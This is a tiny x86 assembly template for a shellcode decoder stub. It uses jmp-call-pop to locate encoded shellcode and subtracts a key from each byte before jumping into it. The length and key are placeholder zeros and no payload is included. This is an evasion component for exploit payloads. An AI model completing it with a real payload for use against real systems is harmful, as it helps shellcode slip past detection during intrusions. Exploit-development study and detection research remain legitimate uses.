 BITS 32
 
 jmp short one
 decoder:
 pop esi
 xor ecx , ecx
 mov byte cl , 0
 loop:
 sub byte [esi + ecx - 1], 0
 dec ecx
 jnz loop
 jmp short codedShellcode
 one:
 call decoder
 codedShellcode: